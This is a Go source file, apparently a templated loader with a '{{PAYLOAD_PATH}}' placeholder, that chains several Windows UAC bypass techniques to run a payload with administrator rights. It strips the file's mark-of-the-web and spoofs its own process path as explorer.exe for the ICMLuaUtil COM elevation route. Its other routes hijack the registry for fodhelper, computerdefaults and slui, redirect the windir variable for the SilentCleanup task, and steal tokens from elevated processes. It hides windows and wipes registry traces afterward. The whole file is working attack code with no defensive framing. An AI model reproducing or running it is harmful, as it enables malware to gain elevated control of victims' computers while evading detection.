package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

const payloadPath = "{{PAYLOAD_PATH}}"

var (
	modNtdll                       = syscall.MustLoadDLL("ntdll.dll")
	procNtQuerySystemInformation   = modNtdll.MustFindProc("NtQuerySystemInformation")
	procNtFilterToken              = modNtdll.MustFindProc("NtFilterToken")
	procNtSetInformationToken      = modNtdll.MustFindProc("NtSetInformationToken")
	modAdvapi32                    = windows.MustLoadDLL("advapi32.dll")
	procCreateProcessWithLogonW    = modAdvapi32.MustFindProc("CreateProcessWithLogonW")
	procImpersonateLoggedOnUser    = modAdvapi32.MustFindProc("ImpersonateLoggedOnUser")
	procAllocateAndInitializeSid   = modAdvapi32.MustFindProc("AllocateAndInitializeSid")
	procFreeSid                    = modAdvapi32.MustFindProc("FreeSid")
	modKernel32                    = windows.MustLoadDLL("kernel32.dll")
	procQueryFullProcessImageNameW = modKernel32.MustFindProc("QueryFullProcessImageNameW")
	procDeleteFileW                = modKernel32.MustFindProc("DeleteFileW")
)

type sidIdentifierAuthority struct {
	Value [6]byte
}

type sidAndAttributes struct {
	Sid        uintptr
	Attributes uint32
}

type startupInfoW struct {
	cb              uint32
	lpReserved      *uint16
	lpDesktop       *uint16
	lpTitle         *uint16
	dwX             uint32
	dwY             uint32
	dwXSize         uint32
	dwYSize         uint32
	dwXCountChars   uint32
	dwYCountChars   uint32
	dwFillAttribute uint32
	dwFlags         uint32
	wShowWindow     uint16
	cbReserved2     uint16
	lpReserved2     *byte
	hStdInput       uintptr
	hStdOutput      uintptr
	hStdError       uintptr
}

type processInformation struct {
	hProcess    uintptr
	hThread     uintptr
	dwProcessId uint32
	dwThreadId  uint32
}

type tokenMandatoryLabel struct {
	Label sidAndAttributes
}

type systemProcessInformation struct {
	NextEntryOffset              uint32
	NumberOfThreads              uint32
	WorkingSetPrivateSize        int64
	WorkingSetCharge             int64
	PagefileUsage                int64
	PeakPagefileUsage            int64
	PrivatePageCount             int64
	LargeVirtualBytes            int64
	LargeVirtualBytesPeak        int64
	PageFaultCount               uint32
	HandleCount                  uint32
	_                            [4]byte
	UniqueProcessId              uintptr
	InheritedFromUniqueProcessId uintptr
	BasePriority                 int32
	_                            [4]byte
	ImageName                    unicodeString2
	UniqueProcessHandle          uintptr
}

type unicodeString2 struct {
	Length        uint16
	MaximumLength uint16
	_             [4]byte
	Buffer        *uint16
}

var mandatoryLabelAuthority = sidIdentifierAuthority{Value: [6]byte{0, 0, 0, 0, 0, 16}}

const (
	tokenIntegrityLevelMedium = 0x2000
	luaTokenFlag              = 0x4
	comReleaseOffset          = 2
	comShellExecuteOffset     = 9
)

var (
	spoofedEntry *windows.LDR_DATA_TABLE_ENTRY
	origDllName  windows.NTUnicodeString
)

func main() {
	if _, err := os.Stat(payloadPath); os.IsNotExist(err) {
		return
	}

	unblockFile(payloadPath)

	if r := tryICMLuaUtil(); r {
		return
	}
	if r := tryFODHelper(); r {
		return
	}
	if r := tryComputerDefaults(); r {
		return
	}
	if r := trySLUI(); r {
		return
	}
	if r := trySilentCleanup(); r {
		return
	}
	if r := tryTokenManipulation(); r {
		return
	}
}

func unblockFile(path string) {
	adsPath, _ := syscall.UTF16PtrFromString(path + ":Zone.Identifier")
	procDeleteFileW.Call(uintptr(unsafe.Pointer(adsPath)))
}

func tryICMLuaUtil() bool {
	if err := windows.CoInitializeEx(0, windows.COINIT_APARTMENTTHREADED); err != nil {
		return false
	}
	defer windows.CoUninitialize()

	spoofProcessPath()

	moniker := "Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
	monikerUTF16, _ := windows.UTF16PtrFromString(moniker)

	iid := windows.GUID{
		Data1: 0x6EDD6D74, Data2: 0xC007, Data3: 0x4E75,
		Data4: [8]byte{0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C},
	}

	bindOpts := &windows.BIND_OPTS3{
		CbStruct:     uint32(unsafe.Sizeof(windows.BIND_OPTS3{})),
		ClassContext: windows.CLSCTX_LOCAL_SERVER,
	}

	var ifacePtr **[0xffff]uintptr
	if err := windows.CoGetObject(
		monikerUTF16, bindOpts, &iid,
		(**uintptr)(unsafe.Pointer(&ifacePtr)),
	); err != nil {
		restoreProcessPath()
		return false
	}
	defer syscall.SyscallN((*ifacePtr)[comReleaseOffset], uintptr(unsafe.Pointer(ifacePtr)))

	payloadUTF16, _ := windows.UTF16PtrFromString(payloadPath)
	ret, _, _ := syscall.SyscallN((*ifacePtr)[comShellExecuteOffset],
		uintptr(unsafe.Pointer(ifacePtr)),
		uintptr(unsafe.Pointer(payloadUTF16)),
		0, 0, 0, 1,
	)
	restoreProcessPath()
	return ret == 0
}

func spoofProcessPath() {
	peb := windows.RtlGetCurrentPeb()
	if peb == nil || peb.Ldr == nil {
		return
	}
	modList := &peb.Ldr.InMemoryOrderModuleList
	imageBase := peb.ImageBaseAddress

	for cur := modList.Flink; cur != modList; cur = cur.Flink {
		entry := (*windows.LDR_DATA_TABLE_ENTRY)(unsafe.Pointer(
			uintptr(unsafe.Pointer(cur)) - unsafe.Offsetof(windows.LDR_DATA_TABLE_ENTRY{}.InMemoryOrderLinks),
		))
		if entry.DllBase != imageBase {
			continue
		}
		spoofedEntry = entry
		origDllName = entry.FullDllName

		windowsDir, _ := windows.GetSystemWindowsDirectory()
		explorerPath := filepath.Join(windowsDir, "explorer.exe")
		explorerUTF16, _ := windows.UTF16PtrFromString(explorerPath)
		windows.RtlInitUnicodeString(&entry.FullDllName, explorerUTF16)
		return
	}
}

func restoreProcessPath() {
	if spoofedEntry != nil {
		spoofedEntry.FullDllName = origDllName
		spoofedEntry = nil
	}
}

func tryFODHelper() bool {
	return hijackAndLaunch(
		`Software\Classes\ms-settings\Shell\Open\Command`,
		"fodhelper.exe",
		func() { deleteKeyTree(`Software\Classes\ms-settings`) },
	)
}

func tryComputerDefaults() bool {
	return hijackAndLaunch(
		`Software\Classes\ms-settings\Shell\Open\Command`,
		"computerdefaults.exe",
		func() { deleteKeyTree(`Software\Classes\ms-settings`) },
	)
}

func trySLUI() bool {
	return hijackAndLaunch(
		`Software\Classes\exefile\Shell\Open\Command`,
		"slui.exe",
		func() { deleteKeyTree(`Software\Classes\exefile`) },
	)
}

func hijackAndLaunch(regPath, binary string, cleanup func()) bool {
	key, _, err := registry.CreateKey(registry.CURRENT_USER, regPath, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		return false
	}
	if err := key.SetStringValue("", payloadPath); err != nil {
		key.Close()
		cleanup()
		return false
	}
	if err := key.SetStringValue("DelegateExecute", ""); err != nil {
		key.Close()
		cleanup()
		return false
	}
	key.Close()

	cmd := exec.Command(binary)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	_ = cmd.Run()

	time.Sleep(2 * time.Second)
	cleanup()
	time.Sleep(5 * time.Second)
	return true
}

func trySilentCleanup() bool {
	key, _, err := registry.CreateKey(registry.CURRENT_USER, `Environment`, registry.SET_VALUE)
	if err != nil {
		return false
	}
	if err := key.SetStringValue("windir", payloadPath); err != nil {
		key.Close()
		return false
	}
	key.Close()

	cmd := exec.Command("cmd", "/C", `schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I`)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	_, _ = cmd.Output()

	time.Sleep(2 * time.Second)
	deleteRegistryValue(`Environment`, "windir")
	time.Sleep(5 * time.Second)
	return true
}

func tryTokenManipulation() bool {
	pids, err := enumProcesses()
	if err != nil {
		return false
	}

	knownProcesses := []string{
		"taskmgr.exe", "computerdefaults.exe", "mmc.exe", "msconfig.exe",
		"shrpubw.exe", "recdisc.exe", "odbcad32.exe", "tpmInit.exe", "iscsicpl.exe",
	}

	for _, pid := range pids {
		if pid == 0 {
			continue
		}
		process, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
		if err != nil {
			continue
		}

		var imageNameBuf [260]uint16
		bufSize := uint32(len(imageNameBuf))
		ret, _, _ := procQueryFullProcessImageNameW.Call(
			uintptr(process), 0,
			uintptr(unsafe.Pointer(&imageNameBuf[0])),
			uintptr(unsafe.Pointer(&bufSize)),
		)
		if ret == 0 {
			windows.CloseHandle(process)
			continue
		}
		imageName := windows.UTF16ToString(imageNameBuf[:])
		if idx := strings.LastIndex(imageName, "\\"); idx >= 0 {
			imageName = imageName[idx+1:]
		}

		isKnown := false
		for _, name := range knownProcesses {
			if strings.EqualFold(imageName, name) {
				isKnown = true
				break
			}
		}
		if !isKnown {
			windows.CloseHandle(process)
			continue
		}

		var tokenHandle windows.Token
		if err := windows.OpenProcessToken(process, windows.TOKEN_QUERY|windows.TOKEN_DUPLICATE, &tokenHandle); err != nil {
			windows.CloseHandle(process)
			continue
		}

		if !tokenHandle.IsElevated() {
			tokenHandle.Close()
			windows.CloseHandle(process)
			continue
		}

		windows.CloseHandle(process)
		result := elevateWithToken(tokenHandle)
		tokenHandle.Close()
		if result {
			return true
		}
	}

	candidates := []string{
		"C:\\Windows\\System32\\ComputerDefaults.exe",
		"C:\\Windows\\System32\\sdclt.exe",
		"C:\\Windows\\System32\\slui.exe",
	}

	for _, candidate := range candidates {
		binaryUTF16, _ := windows.UTF16PtrFromString(candidate)
		var si windows.StartupInfo
		si.Cb = uint32(unsafe.Sizeof(si))
		var pi windows.ProcessInformation

		err := windows.CreateProcess(binaryUTF16, nil, nil, nil, false, windows.CREATE_NEW_CONSOLE, nil, nil, &si, &pi)
		if err != nil {
			continue
		}

		time.Sleep(1 * time.Second)

		process, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION|windows.PROCESS_DUP_HANDLE, false, pi.ProcessId)
		if err != nil {
			windows.TerminateProcess(pi.Process, 1)
			windows.CloseHandle(pi.Process)
			windows.CloseHandle(pi.Thread)
			continue
		}

		var token windows.Token
		if err := windows.OpenProcessToken(process, windows.TOKEN_QUERY|windows.TOKEN_DUPLICATE, &token); err != nil {
			windows.CloseHandle(process)
			windows.TerminateProcess(pi.Process, 1)
			windows.CloseHandle(pi.Process)
			windows.CloseHandle(pi.Thread)
			continue
		}

		windows.TerminateProcess(pi.Process, 1)
		windows.CloseHandle(pi.Process)
		windows.CloseHandle(pi.Thread)
		windows.CloseHandle(process)

		if !token.IsElevated() {
			token.Close()
			continue
		}

		result := elevateWithToken(token)
		token.Close()
		if result {
			return true
		}
	}

	return false
}

func elevateWithToken(token windows.Token) bool {
	var dupToken windows.Token
	if err := windows.DuplicateTokenEx(token, windows.TOKEN_ALL_ACCESS, nil, windows.SecurityImpersonation, windows.TokenPrimary, &dupToken); err != nil {
		return false
	}
	defer dupToken.Close()

	if err := setTokenIntegrityLevel(dupToken, tokenIntegrityLevelMedium); err != nil {
		return false
	}

	var luaToken windows.Handle
	ret2, _, _ := procNtFilterToken.Call(uintptr(dupToken), luaTokenFlag, 0, 0, 0, uintptr(unsafe.Pointer(&luaToken)))
	if ret2 != 0 {
		return false
	}
	defer windows.CloseHandle(luaToken)

	var impToken windows.Token
	if err := windows.DuplicateTokenEx(windows.Token(luaToken), windows.TOKEN_IMPERSONATE|windows.TOKEN_QUERY, nil, windows.SecurityImpersonation, windows.TokenImpersonation, &impToken); err != nil {
		return false
	}
	defer impToken.Close()

	ret3, _, _ := procImpersonateLoggedOnUser.Call(uintptr(impToken))
	if ret3 == 0 {
		return false
	}

	payloadUTF16, _ := windows.UTF16PtrFromString(payloadPath)
	system32, _ := windows.UTF16PtrFromString("C:\\Windows\\System32")
	username, _ := windows.UTF16PtrFromString("aaa")
	domain, _ := windows.UTF16PtrFromString("bbb")
	password, _ := windows.UTF16PtrFromString("ccc")

	var si startupInfoW
	si.cb = uint32(unsafe.Sizeof(si))
	si.dwFlags = 0x00000001
	si.wShowWindow = 1
	var pi processInformation

	ret4, _, _ := procCreateProcessWithLogonW.Call(
		uintptr(unsafe.Pointer(username)),
		uintptr(unsafe.Pointer(domain)),
		uintptr(unsafe.Pointer(password)),
		0x00000002,
		uintptr(unsafe.Pointer(payloadUTF16)),
		0, 0x00000210, 0,
		uintptr(unsafe.Pointer(system32)),
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret4 == 0 {
		return false
	}

	if pi.hProcess != 0 {
		windows.CloseHandle(windows.Handle(pi.hProcess))
	}
	if pi.hThread != 0 {
		windows.CloseHandle(windows.Handle(pi.hThread))
	}
	return true
}

func enumProcesses() ([]uint32, error) {
	var needed uint32
	bufSize := uint32(1024 * 1024)
	buf := make([]byte, bufSize)

	ret, _, _ := procNtQuerySystemInformation.Call(5, uintptr(unsafe.Pointer(&buf[0])), uintptr(bufSize), uintptr(unsafe.Pointer(&needed)))
	if ret != 0 {
		return nil, fmt.Errorf("NtQuerySystemInformation failed")
	}

	var result []uint32
	offset := uint32(0)
	for {
		proc := (*systemProcessInformation)(unsafe.Pointer(&buf[offset]))
		if proc.UniqueProcessId != 0 {
			result = append(result, uint32(proc.UniqueProcessId))
		}
		if proc.NextEntryOffset == 0 {
			break
		}
		offset += proc.NextEntryOffset
	}
	return result, nil
}

func setTokenIntegrityLevel(token windows.Token, level uint32) error {
	var pSid uintptr
	ret, _, _ := procAllocateAndInitializeSid.Call(
		uintptr(unsafe.Pointer(&mandatoryLabelAuthority)), 1, uintptr(level),
		0, 0, 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&pSid)),
	)
	if ret == 0 {
		return fmt.Errorf("AllocateAndInitializeSid failed")
	}
	defer procFreeSid.Call(pSid)

	ml := tokenMandatoryLabel{
		Label: sidAndAttributes{Sid: pSid, Attributes: 0x20},
	}

	ret2, _, _ := procNtSetInformationToken.Call(uintptr(token), 25, uintptr(unsafe.Pointer(&ml)), unsafe.Sizeof(ml))
	if ret2 != 0 {
		return fmt.Errorf("NtSetInformationToken: 0x%X", ret2)
	}
	return nil
}

func deleteKeyTree(subKey string) {
	key, err := registry.OpenKey(registry.CURRENT_USER, subKey, registry.READ)
	if err != nil {
		return
	}
	subKeyNames, _ := key.ReadSubKeyNames(-1)
	key.Close()

	for i := len(subKeyNames) - 1; i >= 0; i-- {
		childPath := subKey + `\` + subKeyNames[i]
		registry.DeleteKey(registry.CURRENT_USER, childPath)
	}
	registry.DeleteKey(registry.CURRENT_USER, subKey)
}

func deleteRegistryValue(subKey, valueName string) {
	key, err := registry.OpenKey(registry.CURRENT_USER, subKey, registry.SET_VALUE)
	if err != nil {
		return
	}
	defer key.Close()
	key.DeleteValue(valueName)
}
